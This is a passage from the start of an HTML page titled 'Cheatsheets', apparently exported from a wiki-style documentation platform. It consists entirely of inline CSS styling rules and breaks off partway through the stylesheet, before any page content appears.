<!doctype html>
<html lang="en-GB">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Cheatsheets</title>

    <style>
            ﻿:root{--color-primary: #206ea7;--color-primary-light: rgba(32,110,167,0.15);--color-page: #206ea7;--color-page-draft: #7e50b1;--color-chapter: #af4d0d;--color-book: #077b70;--color-bookshelf: #a94747}*{box-sizing:border-box;outline-color:var(--color-primary);outline-width:1px}*:focus{outline-style:dotted}html{height:100%;overflow-y:scroll;background-color:#f2f2f2}html.flexbox{overflow-y:hidden}html.dark-mode{background-color:#111}body{font-size:14px;line-height:1.6;color:#444;-webkit-font-smoothing:antialiased;height:100%;display:flex;flex-direction:column}html.dark-mode body{color:#aaa}body,button,input,select,label,textarea{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Oxygen","Ubuntu","Roboto","Cantarell","Fira Sans","Droid Sans","Helvetica Neue",sans-serif}.Codemirror,pre,#markdown-editor-input,.editor-toolbar,.code-base,span.code,code{font-family:"Lucida Console","DejaVu Sans Mono","Ubuntu Mono",Monaco,monospace}h1{font-size:3.425em;line-height:1.22222222em;margin-top:.48888889em;margin-bottom:.48888889em}h2{font-size:2.8275em;line-height:1.294117647em;margin-top:.8627451em;margin-bottom:.43137255em}h3{font-size:2.333em;line-height:1.221428572em;margin-top:.78571429em;margin-bottom:.43137255em}h4{font-size:1.666em;line-height:1.375em;margin-top:.78571429em;margin-bottom:.43137255em}h1,h2,h3,h4,h5,h6{font-weight:400;position:relative;display:block;color:#222}html.dark-mode h1,html.dark-mode h2,html.dark-mode h3,html.dark-mode h4,html.dark-mode h5,html.dark-mode h6{color:#bbb}h1 .subheader,h2 .subheader,h3 .subheader,h4 .subheader,h5 .subheader,h6 .subheader{font-size:.5em;line-height:1em;color:#969696}h5{font-size:1.4em}h5,h6{line-height:1.2em;margin-top:.78571429em;margin-bottom:.66em}@media screen and (max-width: 600px){h1{font-size:2.8275em}h2{font-size:2.333em}h3{font-size:1.666em}h4{font-size:1.333em}h5{font-size:1.161616em}}.list-heading{font-size:2rem}h2.list-heading{font-size:1.333rem}a{color:var(--color-primary);fill:currentColor;cursor:pointer;text-decoration:none;transition:filter ease-in-out 80ms;line-height:1.6}a:hover{text-decoration:underline}a.icon{display:inline-block}a svg{position:relative;display:inline-block}a:focus img:only-child{outline:2px dashed var(--color-primary);outline-offset:2px}a.no-link-style{color:inherit}a.no-link-style:hover{text-decoration:none}.blended-links a{color:inherit}.blended-links a svg{fill:currentColor}p,ul,ol,pre,table,blockquote{margin-top:.3em;margin-bottom:1.375em}hr{border:0;height:1px;background:#eaeaea;margin-bottom:24px}html.dark-mode hr{background:#555}hr.faded{background-image:linear-gradient(to right, #FFF, #e3e0e0 20%, #e3e0e0 80%, #FFF)}hr.darker{background:#ddd}html.dark-mode hr.darker{background:#666}hr.margin-top,hr.even{margin-top:24px}strong,b,.bold,.strong{font-weight:bold}strong>strong,strong>b,strong>.bold,strong>.strong,b>strong,b>b,b>.bold,b>.strong,.bold>strong,.bold>b,.bold>.bold,.bold>.strong,.strong>strong,.strong>b,.strong>.bold,.strong>.strong{font-weight:bolder}em,i,.italic{font-style:italic}small,p.small,span.small,.text-small{font-size:.75rem;color:#5e5e5e}html.dark-mode small,html.dark-mode p.small,html.dark-mode span.small,html.dark-mode .text-small{color:#999}sup,.superscript{vertical-align:super;font-size:.8em}sub,.subscript{vertical-align:sub;font-size:.8em}pre{font-size:12px;border:1px solid #ddd;background-color:#f5f5f5;border-color:#ddd;padding-left:31px;position:relative;padding-top:3px;padding-bottom:3px}html.dark-mode pre{background-color:#2b2b2b}html.dark-mode pre{border-color:#111}pre:after{content:"";display:block;position:absolute;top:0;width:29px;left:0;height:100%;background-color:#f5f5f5;border-right:1px solid #ddd}html.dark-mode pre:after{background-color:#313335}html.dark-mode pre:after{border-right:none}@media print{pre{padding-left:12px}pre:after{display:none}}blockquote{display:block;position:relative;border-left:4px solid var(--color-primary);background-color:#f8f8f8;padding:12px 16px 12px 32px;overflow:auto}html.dark-mode blockquote{background-color:#333}blockquote:before{content:"“";font-size:2em;font-weight:bold;position:absolute;top:12px;left:12px;color:#777}.text-mono{font-family:"Lucida Console","DejaVu Sans Mono","Ubuntu Mono",Monaco,monospace}.text-uppercase{text-transform:uppercase}.text-capitals{text-transform:capitalize}.code-base,span.code,code{font-size:.84em;border:1px solid #ddd;border-radius:3px;background-color:#f8f8f8;border-color:#ddd}html.dark-mode .code-base,html.dark-mode span.code,html.dark-mode code{background-color:#2b2b2b}html.dark-mode .code-base,html.dark-mode span.code,html.dark-mode code{border-color:#444}code{display:inline;padding:1px 3px;white-space:pre-wrap;line-height:1.2em}span.code{padding:1px 6px}pre code{background-color:transparent;border:0;font-size:1em;display:block;line-height:1.6}span.highlight{font-weight:bold;padding:2px 4px}ul p,ol p{margin:0}ul{list-style:disc}ul ul{list-style:circle}ul label{margin:0}ol{list-style:decimal}ol,ul{padding-left:32px;padding-right:32px}li>ol,li>ul{margin-top:0;margin-bottom:0;margin-block-end:0;margin-block-start:0;padding-block-end:0;padding-block-start:0;padding-left:19.2px;padding-right:19.2px}li.checkbox-item,li.task-list-item{list-style:none;margin-left:-19.2px}li.checkbox-item input[type=checkbox],li.task-list-item input[type=checkbox]{margin-right:6px}li.checkbox-item li.checkbox-item,li.checkbox-item li.task-list-item,li.task-list-item li.checkbox-item,li.task-list-item li.task-list-item{margin-left:6px}.underlined{text-decoration:underline}.text-center{text-align:center}.text-left{text-align:start}.text-right{text-align:end}@media screen and (min-width: 360px){.text-xxs-center{text-align:center}.text-xxs-left{text-align:start}.text-xxs-right{text-align:end}}@media screen and (min-width: 400px){.text-xs-center{text-align:center}.text-xs-left{text-align:start}.text-xs-right{text-align:end}}@media screen and (min-width: 600px){.text-s-center{text-align:center}.text-s-left{text-align:start}.text-s-right{text-align:end}}@media screen and (min-width: 880px){.text-m-center{text-align:center}.text-m-left{text-align:start}.text-m-right{text-align:end}}@media screen and (min-width: 1000px){.text-l-center{text-align:center}.text-l-left{text-align:start}.text-l-right{text-align:end}}@media screen and (min-width: 1100px){.text-xl-center{text-align:center}.text-xl-left{text-align:start}.text-xl-right{text-align:end}}.text-bigger{font-size:1.1em}.text-large{font-size:1.6666em}.no-color{color:inherit}.break-text{word-wrap:break-word;overflow-wrap:break-word}.text-limit-lines-1{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.text-limit-lines-2{display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:2;overflow:hidden}.header-group{margin:16px 0}.header-group h1,.header-group h2,.header-group h3,.header-group h4,.header-group h5,.header-group h6{margin:0}span.sep{color:#bbb;padding:0 6px}.list>*{display:block}.svg-icon{width:1em;height:1em;display:inline-block;position:relative;bottom:-0.105em;margin-inline-end:6px;pointer-events:none;fill:currentColor}.container{max-width:1400px;margin-inline-start:auto;margin-inline-end:auto;padding-inline-start:16px;padding-inline-end:16px}.container.small{max-width:840px}.container.very-small{max-width:480px}.grid{display:grid;grid-column-gap:24px;grid-row-gap:24px}.grid.half{grid-template-columns:1fr 1fr}.grid.third{grid-template-columns:1fr 1fr 1fr}.grid.left-focus{grid-template-columns:2fr 1fr}.grid.right-focus{grid-template-columns:1fr 3fr}.grid.gap-y-xs{grid-row-gap:6px}.grid.gap-xl{grid-column-gap:32px;grid-row-gap:32px}.grid.gap-xxl{grid-column-gap:48px;grid-row-gap:48px}.grid.v-center{align-items:center}.grid.v-end{align-items:end}.grid.no-gap{grid-row-gap:0;grid-column-gap:0}.grid.no-row-gap{grid-row-gap:0}@media screen and (max-width: 880px){.grid.third:not(.no-break){grid-template-columns:1fr 1fr}.grid.half:not(.no-break),.grid.left-focus:not(.no-break),.grid.right-focus:not(.no-break){grid-template-columns:1fr}.grid.half.collapse-xs{grid-template-columns:1fr 1fr}.grid.gap-xl{grid-column-gap:16px;grid-row-gap:16px}.grid.right-focus.reverse-collapse>*:nth-child(2){order:0}.grid.right-focus.reverse-collapse>*:nth-child(1){order:1}}@media screen and (max-width: 600px){.grid.third:not(.no-break){grid-template-columns:1fr}}@media screen and (max-width: 400px){.grid.half.collapse-xs{grid-template-columns:1fr}}#content{flex:1 0 auto}body.flexbox{display:flex;flex-direction:column;align-items:stretch;height:100%;min-height:100%;max-height:100%;overflow:hidden}body.flexbox #content{flex:1;display:flex;min-height:0}.flex-fill{display:flex;align-items:stretch;min-height:0;max-width:100%;position:relative}.flex-container-row{display:flex;flex-direction:row}.flex-container-row.v-center{align-items:center}.flex-container-column{display:flex;flex-direction:column}.flex-container-column.wrap,.flex-container-row.wrap{flex-wrap:wrap}.flex{min-height:0;flex:1;max-width:100%}.flex.fit-content{flex-basis:auto;flex-grow:0}.justify-flex-end{justify-content:flex-end}.justify-center{justify-content:center}.justify-space-between{justify-content:space-between}.items-center{align-items:center}.block{display:block !important;position:relative}.inline{display:inline !important}.block.inline{display:inline-block !important}.relative{position:relative}.hidden{display:none !important}.fill-height{height:100%}.float{float:left}.float.right{float:right}@media screen and (max-width: 360px){.hide-under-xxs{display:none !important}}@media screen and (min-width: 360px){.hide-over-xxs{display:none !important}}@media screen and (max-width: 400px){.hide-under-xs{display:none !important}}@media screen and (min-width: 400px){.hide-over-xs{display:none !important}}@media screen and (max-width: 600px){.hide-under-s{display:none !important}}@media screen and (min-width: 600px){.hide-over-s{display:none !important}}@media screen and (max-width: 880px){.hide-under-m{display:none !important}}@media screen and (min-width: 880px){.hide-over-m{display:none !important}}@media screen and (max-width: 1000px){.hide-under-l{display:none !important}}@media screen and (min-width: 1000px){.hide-over-l{display:none !important}}@media screen and (max-width: 1100px){.hide-under-xl{display:none !important}}@media screen and (min-width: 1100px){.hide-over-xl{display:none !important}}.rounded{border-radius:4px}.dual-column-content{columns:2}@media screen and (max-width: 880px){.dual-column-content{columns:1}}.clearfix::before,.clearfix::after{content:" ";display:table}.clearfix::after{clear:both}.tri-layout-container{display:grid;margin-inline-start:32px;margin-inline-end:32px;grid-template-columns:1fr 4fr 1fr;grid-template-areas:"a b c";grid-column-gap:48px}.tri-layout-container .tri-layout-right{grid-area:c;min-width:0}.tri-layout-container .tri-layout-left{grid-area:a;min-width:0}.tri-layout-container .tri-layout-middle{grid-area:b;padding-top:16px;min-width:0}@media screen and (max-width: 1400px){.tri-layout-container{grid-template-areas:"c b b" "a b b" ". b b";grid-template-columns:1fr 3fr;grid-template-rows:min-content min-content 1fr;padding-inline-end:24px}}@media screen and (min-width: 1000px)and (max-width: 1400px){.tri-layout-left{position:sticky;top:16px}}@media screen and (min-width: 1400px){.tri-layout-left-contents,.tri-layout-right-contents{padding:16px;position:sticky;top:16px;max-height:100vh;min-height:50vh;overflow-y:scroll;overflow-x:hidden;height:100%;scrollbar-width:none;-ms-overflow-style:none}.tri-layout-left-contents::-webkit-scrollbar,.tri-layout-right-contents::-webkit-scrollbar{display:none}.tri-layout-middle-contents{max-width:940px;margin:0 auto}}@media screen and (max-width: 1000px){.tri-layout-container{grid-template-areas:none;grid-template-columns:1fr;grid-column-gap:0;padding-inline-end:6px;padding-inline-start:6px}.tri-layout-container .tri-layout-left-contents,.tri-layout-container .tri-layout-right-contents{padding-inline-start:16px;padding-inline-end:16px}.tri-layout-container .tri-layout-left>*,.tri-layout-container .tri-layout-right>*{display:none;pointer-events:none}.tri-layout-container .tri-layout-left,.tri-layout-container .tri-layout-right{grid-area:none;grid-column:1/1;grid-row:1;padding-top:0 !important}.tri-layout-container .tri-layout-middle{grid-area:none;grid-row:3;grid-column:1/1;z-index:1;overflow:hidden;transition:transform ease-in-out 240ms}.tri-layout-container .tri-layout-left{grid-row:2}.tri-layout-container.show-info{overflow:hidden}.tri-layout-container.show-info .tri-layout-middle{display:none}.tri-layout-container.show-info .tri-layout-right>*,.tri-layout-container.show-info .tri-layout-left>*{display:block;pointer-events:auto}}@media screen and (min-width: 1000px){.tri-layout-mobile-tabs{display:none}.tri-layout-left-contents>*,.tri-layout-right-contents>*{opacity:.6;transition:opacity ease-in-out 120ms}.tri-layout-left-contents>*:hover,.tri-layout-right-contents>*:hover{opacity:1}.tri-layout-left-contents>*:focus-within,.tri-layout-right-contents>*:focus-within{opacity:1}}@media screen and (max-width: 880px){.tri-layout-container{margin-inline-start:0;margin-inline-end:0}}.callout{border-inline-start:3px solid #bbb;background-color:#eee;padding:12px 12px 12px 32px;display:block;position:relative;overflow:auto}.callout:before{background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiMwMTUzODAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTEgMTVoLTJ2LTZoMnY2em0wLThoLTJWN2gydjJ6Ii8+PC9zdmc+");background-repeat:no-repeat;content:"";width:1.2em;height:1.2em;left:8px;top:50%;margin-top:-9px;display:inline-block;position:absolute;line-height:1;opacity:.8}.callout.success{border-left-color:#0f7d15;background-color:#eafdeb;color:#063409}html.dark-mode .callout.success{background-color:#031904}html.dark-mode .callout.success{color:#129419}.callout.success:before{background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiMzNzZjMzkiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0yIDE1bC01LTUgMS40MS0xLjQxTDEwIDE0LjE3bDcuNTktNy41OUwxOSA4bC05IDl6Ii8+PC9zdmc+")}.callout.danger{border-left-color:#ab0f0e;background-color:#fcdbdb;color:#4d0706}html.dark-mode .callout.danger{background-color:#1e0302}html.dark-mode .callout.danger{color:#c31110}.callout.danger:before{background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiNiOTE4MTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0xNS43MyAzSDguMjdMMyA4LjI3djcuNDZMOC4yNyAyMWg3LjQ2TDIxIDE1LjczVjguMjdMMTUuNzMgM3pNMTIgMTcuM2MtLjcyIDAtMS4zLS41OC0xLjMtMS4zIDAtLjcyLjU4LTEuMyAxLjMtMS4zLjcyIDAgMS4zLjU4IDEuMyAxLjMgMCAuNzItLjU4IDEuMy0xLjMgMS4zem0xLTQuM2gtMlY3aDJ2NnoiLz4gICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjwvc3ZnPg==")}.callout.info{border-left-color:#0288d1;color:#01466c;background-color:#d3efff}html.dark-mode .callout.info{color:#09a7fd}html.dark-mode .callout.info{background-color:#001520}.callout.warning{border-left-color:#cf4d03;background-color:#fee3d3;color:#6a2802}html.dark-mode .callout.warning{background-color:#1a0a00}html.dark-mode .callout.warning{color:#cf4d03}.callout.warning:before{background-image:url("data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IiNiNjUzMWMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+ICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4gICAgPHBhdGggZD0iTTEgMjFoMjJMMTIgMiAxIDIxem0xMi0zaC0ydi0yaDJ2MnptMC00aC0ydi00aDJ2NHoiLz48L3N2Zz4=")}.callout a{color:inherit;text-decoration:underline}.card{background-color:#fff;box-shadow:0 1px 6px -1px rgba(0,0,0,.1);border-radius:3px;border:1px solid transparent}html.dark-mode .card{background-color:#222}.card .body,.card p.empty-text{padding:16px}.card a,.card p{word-wrap:break-word;word-break:break-word}.card-title{padding:16px 16px 6px;margin:0;font-size:14px;color:#222;fill:#222;font-weight:400}.card-title a{line-height:1}.card.border-card{border:1px solid #ddd}.card.drag-card{border:1px solid #ddd;border-color:#ddd;background-color:#fff;border-radius:4px;display:flex;padding:0 0 0 40px;margin:12px 0;position:relative}html.dark-mode .card.drag-card{border-color:#000}html.dark-mode .card.drag-card{background-color:#333}.card.drag-card .drag-card-action{cursor:pointer}.card.drag-card .handle,.card.drag-card .drag-card-action{display:flex;align-items:center;text-align:center;justify-content:center;width:28px;flex-grow:0;padding:0 6px}.card.drag-card .handle:hover,.card.drag-card .drag-card-action:hover{background-color:#eee}.card.drag-card .handle .svg-icon,.card.drag-card .drag-card-action .svg-icon{margin-inline-end:0px}.card.drag-card .outline input{margin:12px 0;width:100%}.card.drag-card .outline{position:relative}.card.drag-card .handle{background-color:#eee;left:0;position:absolute;top:0;bottom:0}html.dark-mode .card.drag-card .handle{background-color:#2d2d2d}.card.drag-card>div{padding:0 12px;max-width:80%;flex:1}.grid-card{display:flex;flex-direction:column;border:1px solid #ddd;border-color:#ddd;margin-bottom:24px;border-radius:4px;overflow:hidden;min-width:100px;color:#444;transition:border-color ease-in-out 120ms,box-shadow ease-in-out 120ms}html.dark-mode .grid-card{border-color:#000}.grid-card:hover{color:#444;text-decoration:none;box-shadow:0 1px 6px -1px rgba(0,0,0,.1)}html.dark-mode .grid-card:hover{box-shadow:0 1px 6px -1px rgba(0,0,0,.5)}.grid-card h2{width:100%;font-size:1.5em;margin:0 0 10px}.grid-card p{font-size:.7rem;margin:0;line-height:1.6em}.grid-card .grid-card-content{flex:1;border-top:0;border-bottom-width:2px}.grid-card .grid-card-content,.grid-card .grid-card-footer{padding:24px}.grid-card .grid-card-content+.grid-card-footer{padding-top:0}.book-grid-item .grid-card-footer p.small{font-size:.8em;margin:0}.content-wrap.card{padding:16px 48px;margin-inline-start:auto;margin-inline-end:auto;margin-bottom:24px;overflow:initial;min-height:60vh}.content-wrap.card.auto-height{min-height:0}.content-wrap.card.fill-width{width:100%}@media screen and (max-width: 1400px){.content-wrap.card{padding:16px 32px}}@media screen and (max-width: 880px){.content-wrap.card{padding:16px 24px}}@media screen and (max-width: 600px){.content-wrap.card{padding:16px 16px}}.outline-hover{border:1px solid transparent !important}.outline-hover:hover{border:1px solid rgba(0,0,0,.1) !important}.fade-in-when-active{opacity:.6;transition:opacity ease-in-out 120ms}.fade-in-when-active:hover,.fade-in-when-active:focus-within{opacity:1}.tag-item{display:inline-flex;margin-bottom:6px;margin-inline-end:6px;border-radius:4px;border:1px solid;overflow:hidden;font-size:.85em;border-color:#ccc}html.dark-mode .tag-item{border-color:#666}.tag-item a,.tag-item span,.tag-item a:hover,.tag-item a:active{padding:4px 8px;color:rgba(0,0,0,.6);transition:background-color ease-in-out 80ms;text-decoration:none}html.dark-mode .tag-item a,html.dark-mode .tag-item span,html.dark-mode .tag-item a:hover,html.dark-mode .tag-item a:active{color:rgba(255,255,255,.8)}.tag-item a:hover{background-color:rgba(255,255,255,.7)}html.dark-mode .tag-item a:hover{background-color:rgba(255,255,255,.3)}.tag-item svg{fill:rgba(0,0,0,.5)}html.dark-mode .tag-item svg{fill:rgba(255,255,255,.5)}.tag-item .tag-value{border-inline-start:1px solid;border-color:#ddd;background-color:rgba(255,255,255,.5)}html.dark-mode .tag-item .tag-value{border-color:#666}html.dark-mode .tag-item .tag-value{background-color:rgba(255,255,255,.2)}.tag-list div:last-child .tag-item{margin-bottom:0}.api-method{font-size:.75rem;background-color:#888;padding:6px;line-height:1.3;opacity:.7;vertical-align:top;border-radius:3px;color:#fff;display:inline-block;min-width:60px;text-align:center;font-weight:bold}.api-method[data-method=GET]{background-color:#077b70}.api-method[data-method=POST]{background-color:#cf4d03}.api-method[data-method=PUT]{background-color:#0288d1}.api-method[data-method=DELETE]{background-color:#ab0f0e}.sticky-sidebar{position:sticky;top:16px;max-height:calc(100vh - 16px);overflow-y:auto}table{min-width:100px;max-width:100%}table thead{background-color:#f8f8f8;font-weight:500}html.dark-mode table thead{background-color:#333}table td,table th{min-width:10px;padding:6px 8px;border:1px solid #ddd;overflow:auto;line-height:1.2;word-break:break-word}table td p,table th p{margin:0}table.table{width:100%}table.table tr td,table.table tr th{border-bottom:1px solid rgba(0,0,0,.05)}table.table th,table.table td{text-align:start;border:none;padding:12px 12px;vertical-align:middle;margin:0;overflow:visible}table.table th{font-weight:bold}table.table tr:hover{background-color:#eee}html.dark-mode table.table tr:hover{background-color:#333}table.table .text-right{text-align:end}table.table .text-center{text-align:center}table.table td.actions{overflow:visible}table.table a{display:inline-block}table.no-style td{border:0;padding:0}table.list-table{margin:-6px}table.list-table td{border:0;vertical-align:middle;padding:6px}.book-contents .entity-list-item .icon{width:4px;border-radius:1px;justify-self:stretch;align-self:stretch;height:auto;margin-inline-end:24px}.book-contents .entity-list-item .icon:after{opacity:.5}.book-contents .entity-list-item .icon svg{display:none}.book-contents .entity-list-item p{margin-bottom:0}.book-contents .entity-list-item .inner-page{padding-top:0;padding-bottom:0}.entity-list-item+.chapter-expansion{display:flex;padding:0 16px 16px 16px;align-items:center;border:0;width:100%;position:relative}.entity-list-item+.chapter-expansion>.icon{width:4px;height:auto;border-radius:0 0 1px 1px;align-self:stretch;flex-shrink:0}.entity-list-item+.chapter-expansion>.icon:before{position:absolute;top:0;left:0;width:100%;height:1px;background-color:currentColor;content:"";opacity:.5}.entity-list-item+.chapter-expansion>.icon:after{opacity:.5}.entity-list-item+.chapter-expansion .icon svg{display:none}.entity-list-item+.chapter-expansion>.content{flex:1}.entity-list-item+.chapter-expansion .chapter-expansion-toggle{border-radius:0 4px 4px 0;padding:6px 16px;width:100%;text-align:start}.entity-list-item+.chapter-expansion .chapter-expansion-toggle:hover{background-color:rgba(0,0,0,.06)}.entity-list-item.has-children{padding-bottom:0}.entity-list-item.has-children>.icon{border-radius:4px 4px 0 0}.inset-list{display:none}.inset-list .entity-list-item-name{font-size:1rem}.inset-list .entity-list-item-children{padding-top:0;padding-bottom:0}.sidebar-page-nav{list-style:none;margin-block-start:12px;margin-block-end:16px;margin-inline-start:6px;margin-inline-end:0;position:relative}.sidebar-page-nav:after{content:"";display:block;position:absolute;left:0;background-color:rgba(0,0,0,.2);width:2px;top:5px;bottom:5px;z-index:0}html[dir=rtl] .sidebar-page-nav:after{left:auto;right:0}html.dark-mode .sidebar-page-nav:after{background-color:rgba(255,255,255,.2)}.sidebar-page-nav li{margin-bottom:4px;font-size:.95em;position:relative}.sidebar-page-nav .h1{padding-inline-start:16px}.sidebar-page-nav .h2{padding-inline-start:24px}.sidebar-page-nav .h3{padding-inline-start:32px}.sidebar-page-nav .h4{padding-inline-start:40px}.sidebar-page-nav .h5{padding-inline-start:48px}.sidebar-page-nav .h6{padding-inline-start:56px}.sidebar-page-nav .current-heading{font-weight:bold}.sidebar-page-nav li:not(.current-heading) .sidebar-page-nav-bullet{background-color:#bbb !important}html.dark-mode .sidebar-page-nav li:not(.current-heading) .sidebar-page-nav-bullet{background-color:#666 !important}.sidebar-page-nav .sidebar-page-nav-bullet{width:6px;height:6px;position:absolute;left:-2px;top:30%;border-radius:50%;box-shadow:0 0 0 6px #f2f2f2;box-shadow:0 0 0 6px #f2f2f2;z-index:1}html.dark-mode .sidebar-page-nav .sidebar-page-nav-bullet{box-shadow:0 0 0 6px #111}html[dir=rtl] .sidebar-page-nav .sidebar-page-nav-bullet{left:auto;right:-2px}.book-tree .sidebar-page-list{list-style:none;margin-block-start:6px;margin-block-end:0;margin-inline-start:-12px;margin-inline-end:-12px;padding-inline-start:0;padding-inline-end:0;position:relative}.book-tree .sidebar-page-list:after,.book-tree .sidebar-page-list .sub-menu:after{content:"";display:block;position:absolute;left:16px;top:1rem;bottom:1rem;border-inline-start:4px solid rgba(0,0,0,.1);z-index:0}html[dir=rtl] .book-tree .sidebar-page-list:after,html[dir=rtl] .book-tree .sidebar-page-list .sub-menu:after{left:auto;right:16px}.book-tree .sidebar-page-list ul{list-style:none;padding-inline-start:1rem;padding-inline-end:0}.book-tree .sidebar-page-list .entity-list-item{padding-top:3px;padding-bottom:3px;background-clip:content-box;border-radius:0 3px 3px 0}.book-tree .sidebar-page-list .entity-list-item .content{padding-top:6px;padding-bottom:6px;max-width:calc(100% - 20px)}.book-tree .sidebar-page-list .entity-list-item.selected{background-color:rgba(0,0,0,.08)}.book-tree .sidebar-page-list .entity-list-item.no-hover{margin-top:-6px;padding-inline-end:0}.book-tree .sidebar-page-list .entity-list-item-name{font-size:1em;margin:0}.book-tree .sidebar-page-list .chapter-child-menu{font-size:.8rem;margin-top:-0.2rem;margin-inline-start:-1rem}.book-tree .sidebar-page-list [chapter-toggle]{padding-inline-start:.7rem;padding-bottom:.2rem}.book-tree .sidebar-page-list .entity-list-item .icon{z-index:2;width:4px;height:auto;align-self:stretch;flex-shrink:0;border-radius:1px;opacity:.6}.book-tree .sidebar-page-list .entity-list-item .icon:after{opacity:1}.book-tree .sidebar-page-list .entity-list-item .icon svg{display:none}.chapter-child-menu ul.sub-menu{display:none;padding-inline-start:0;position:relative}.chapter-child-menu [chapter-toggle].open+.sub-menu{display:block}.sortable-page-list,.sortable-page-list ul{list-style:none}.sort-box{margin-bottom:16px;padding:16px 32px;position:relative}.sort-box::before{pointer-events:none;content:"";border-radius:4px;opacity:.5;border:2px solid var(--color-book);display:block;top:0;bottom:0;left:0;right:0;position:absolute}.sort-box-options{display:flex;flex-wrap:wrap;justify-content:space-between}.sort-box-options .button{margin-inline-start:0}.sortable-page-list{margin-inline-start:0;padding:0}.sortable-page-list .entity-list-item>span:first-child{align-self:flex-start}.sortable-page-list .sortable-selected .entity-list-item,.sortable-page-list .sortable-selected .entity-list-item:hover{outline:1px dotted var(--color-primary);background-color:var(--color-primary-light) !important}.sortable-page-list .entity-list-item>div{display:block;flex:1}.sortable-page-list>ul{margin-inline-start:0}.sortable-page-list ul{margin-bottom:16px;margin-top:0;padding-inline-start:16px}.sortable-page-list li{border:1px solid #ddd;margin-top:-1px;min-height:38px}.sortable-page-list li.text-page,.sortable-page-list li.text-chapter{border-inline-start:2px solid currentColor}.sortable-page-list li:first-child{margin-top:6px}.sortable-page-list li.placeholder{position:relative}.sortable-page-list li.placeholder:before{position:absolute}.activity-list-item{padding:12px 0;display:grid;grid-template-columns:min-content 1fr;grid-column-gap:16px;font-size:.9em}.card .activity-list-item{padding:12px 16px}.user-list-item{display:inline-grid;padding:12px;grid-template-columns:min-content 1fr;grid-column-gap:16px;font-size:.9em;align-items:center}.user-list-item>div:first-child{line-height:0}ul.pagination{display:inline-block;list-style:none;margin:16px 0;padding-inline-start:1px}ul.pagination li{float:left}ul.pagination li:first-child a,ul.pagination li:first-child span{border-radius:3px 0 0 3px}ul.pagination li:last-child a,ul.pagination li:last-child span{border-radius:0 3px 3px 0}ul.pagination a,ul.pagination span{display:block;padding:3px 12px;border:1px solid #ccc;margin-inline-start:-1px;user-select:none;color:#555;border-color:#ccc}html.dark-mode ul.pagination a,html.dark-mode ul.pagination span{color:#eee}html.dark-mode ul.pagination a,html.dark-mode ul.pagination span{border-color:#666}ul.pagination li.disabled{cursor:not-allowed}ul.pagination li.active span{color:#111;background-color:rgba(0,0,0,.05)}html.dark-mode ul.pagination li.active span{color:#eee}html.dark-mode ul.pagination li.active span{background-color:rgba(0,0,0,.5)}.compact ul.pagination{margin:0}.entity-list,.icon-list{margin:0 -16px}.entity-list h4,.icon-list h4{margin:0}.entity-list hr,.icon-list hr{margin:0}.entity-list .text-small.text-muted,.icon-list .text-small.text-muted{color:#aaa;font-size:.75em;margin-top:6px}.entity-list .text-muted p.text-muted,.icon-list .text-muted p.text-muted{margin-top:0}.entity-list .page.draft .text-page,.icon-list .page.draft .text-page{color:var(--color-page-draft);fill:var(--color-page-draft)}.entity-list>.dropdown-container,.icon-list>.dropdown-container{display:block}.icon-list hr{margin:12px 16px;max-width:140px;opacity:.25;height:1.1px}.icon-list hr+hr,.icon-list hr:first-child,.icon-list hr:last-child{display:none}.entity-list-item,.icon-list-item{padding:12px 16px;display:flex;align-items:center;background-color:transparent;border:0;width:100%;position:relative;word-break:break-word}.entity-list-item h4 a,.icon-list-item h4 a{color:#666}.entity-list-item>span:first-child,.icon-list-item>span:first-child{margin-inline-end:16px;flex-basis:1.88em;flex:none}.entity-list-item>span:last-child,.icon-list-item>span:last-child{flex:1;text-align:start}.entity-list-item>.content,.icon-list-item>.content{min-width:0}.entity-list-item:not(.no-hover),.icon-list-item:not(.no-hover){cursor:pointer}.entity-list-item:not(.no-hover):hover,.icon-list-item:not(.no-hover):hover{text-decoration:none;background-color:rgba(0,0,0,.1);border-radius:4px}.entity-list-item.outline-hover:hover,.icon-list-item.outline-hover:hover{background-color:transparent}.entity-list-item:focus,.icon-list-item:focus{background-color:#eee;outline:1px dotted #666;outline-offset:-2px}html.dark-mode .entity-list-item:focus,html.dark-mode .icon-list-item:focus{background-color:#222}.entity-list-item-path-sep{display:inline-block;vertical-align:top;position:relative;top:1px}.entity-list-item-path-sep svg{margin-inline-end:0}.card .entity-list-item:not(.no-hover):hover{background-color:#f2f2f2}html.dark-mode .card .entity-list-item:not(.no-hover):hover{background-color:#2d2d2d}.card .entity-list-item .entity-list-item:hover{background-color:#eee}.entity-list-item-children{padding:16px}.entity-list-item-children>div{overflow:hidden;padding:6px 0;margin-top:-6px}.entity-list-item-children 